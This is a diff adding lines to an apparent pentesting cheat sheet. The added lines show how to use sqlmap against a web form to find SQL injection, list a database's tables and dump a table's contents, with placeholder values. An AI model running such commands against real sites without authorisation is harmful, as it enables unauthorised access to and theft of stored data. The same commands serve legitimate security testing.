@@ -72,3 +72,7 @@ ________________________________________________________________________________
 HOW TO USE SQLMAP FOR SQL INJECTION:
 sqlmap -u URL --forms --dbs --threads 10
 this will test to see if a login page or form is vulnerable to SQL injection
+Once you find the name of a database enumerate by doing:
+sqlmap -u URL --forms -D DATABASE --tables --threads 10
+When you have the name of the table enumerate it by doing:
+sqlmap -u URL --forms -T TABLENAME --dump --threads 10
